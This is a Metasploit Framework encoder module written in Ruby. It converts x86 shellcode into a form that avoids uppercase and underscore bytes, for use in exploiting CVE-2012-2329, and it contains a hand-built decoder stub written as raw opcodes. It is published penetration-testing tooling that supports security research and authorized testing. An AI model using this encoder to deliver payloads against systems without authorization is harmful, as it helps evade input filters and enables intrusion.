##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder

  # This encoder has a manual ranking because it should only be used in cases
  # where information has been explicitly supplied, like the BufferOffset.
  Rank = ManualRanking

  # This encoder is a modified version of the sakpe's Avoid UTF8/tolower one, having
  # into account the next set of bad chars for CVE-2012-2329 exploitation:
  # "\x00\x0d\x0a"
  # "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
  # "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5f"
  # "\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e"
  # "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f"
  def initialize
    super(
      'Name'             => 'Avoid underscore/tolower',
      'Description'      => %q{
          Underscore/tolower Safe Encoder used to exploit CVE-2012-2329. It is a
        modified version of the 'Avoid UTF8/tolower' encoder by skape. Please check
        the documentation of the skape encoder before using it. As the original,
        this encoder expects ECX pointing to the start of the encoded payload. Also
        BufferOffset must be provided if needed.

        The changes introduced are (1) avoid the use of the 0x5f byte (underscore) in
        because it is a badchar in the CVE-2012-2329 case and (2) optimize the
        transformation block, having into account more relaxed conditions about bad
        characters greater than 0x80.
      },
      'Author'           =>
        [
          'skape', # avoid_utf8_lower Author
          'juan vazquez' # Adapted to be usable on CVE-2012-2329
        ],
      'Arch'             => ARCH_X86,
      'License'          => MSF_LICENSE,
      'EncoderType'      => Msf::Encoder::Type::NonUpperUnderscoreSafe,
      'Decoder'          =>
        {
          'KeySize'    => 4,
          'BlockSize'  => 4,
        })
  end

  #
  # Returns the decoder stub that is adjusted for the size of
  # the buffer being encoded
  #
  def decoder_stub(state)
    len = ((state.buf.length + 3) & (~0x3)) / 4

    # Grab the number of additional bytes that we need to adjust by in order
    # to get the context register to point immediately after the stub header
    off = (datastore['BufferOffset'] || 0).to_i

    # Check to make sure that the length is a valid size
    while is_badchar(state, len)
      # Prepend "\x90" nops to avoid break anything. Anyway it's going to be encoded.
      state.buf = "\x90\x90\x90\x90" + state.buf
      len = ((state.buf.length + 3) & (~0x3)) / 4
    end

    decoder =
      "\x6a" + [len].pack('C')      +  # push len
      "\x6b\x3c\x24\x09"            +  # imul 0x9
      "\x60"                        +  # pusha
      "\x03\x0c\x24"                +  # add ecx, [esp]
      "\x6a" + [0x11+off].pack('C') +  # push byte 0x11 + off
      "\x03\x0c\x24"                +  # add ecx, [esp]
      "\x6a\x04"                       # push byte 0x4

    # encoded sled
    state.context = ''

    return decoder
  end

  def encode_block(state, block)
    buf = try_add(state, block)

    if (buf.nil?)
      buf = try_sub(state, block)
    end

    if (buf.nil?)
      raise BadcharError.new(state.encoded, 0, 0, 0)
    end

    buf
  end

  #
  # Appends the encoded context portion.
  #
  def encode_end(state)
    state.encoded += state.context
  end

  #
  # Generate the instructions that will be used to produce a valid
  # block after decoding using the sub instruction in conjunction with
  # two underscore/tolower safe values.
  #
  def try_sub(state, block)
    buf = "\x81\x29";
    vbuf  = ''
    ctx   = ''
    carry = 0

    block.each_byte { |b|

      x          = 0
      y          = 0
      attempts   = 0
      prev_carry = carry

      begin
        carry = prev_carry

        if (b > 0x80)
          diff  = 0x100 - b
          y     = rand(0x80 - diff - 1).to_i + 1
          x     = (0x100 - (b - y + carry))
          carry = 1
        else
          diff  = 0x7f - b
          x     = rand(diff - 1) + 1
          y     = (b + x + carry) & 0xff
          carry = 0
        end

        attempts += 1

        # Lame.
        return nil if (attempts > 512)

      end while (is_badchar(state, x) or is_badchar(state, y))

      vbuf += [x].pack('C')
      ctx  += [y].pack('C')
    }

    buf += vbuf + "\x03\x0c\x24"

    state.context += ctx

    return buf

  end

  #
  # Generate instructions that will be used to produce a valid block after
  # decoding using the add instruction in conjunction with two underscore/tolower
  # safe values.
  #
  def try_add(state, block)
    buf  = "\x81\x01"
    vbuf = ''
    ctx  = ''

    block.each_byte { |b|

      attempts = 0

      begin
        if b == 0x00
          xv = rand(b - 1) # badchars will kill 0x00 if it isn't allowed
        else
          xv = rand(b - 1) + 1
        end


        attempts += 1

        # Lame.
        return nil if (attempts > 512)

      end while (is_badchar(state, xv) or is_badchar(state, b - xv))

      vbuf += [xv].pack('C')
      ctx  += [b - xv].pack('C')
    }

    buf += vbuf + "\x03\x0c\x24"

    state.context += ctx

    return buf
  end

  def is_badchar(state, val)
    (val >= 0x41 and val <= 0x5a) or val == 0x5f or Rex::Text.badchar_index([val].pack('C'), state.badchars)
  end
end
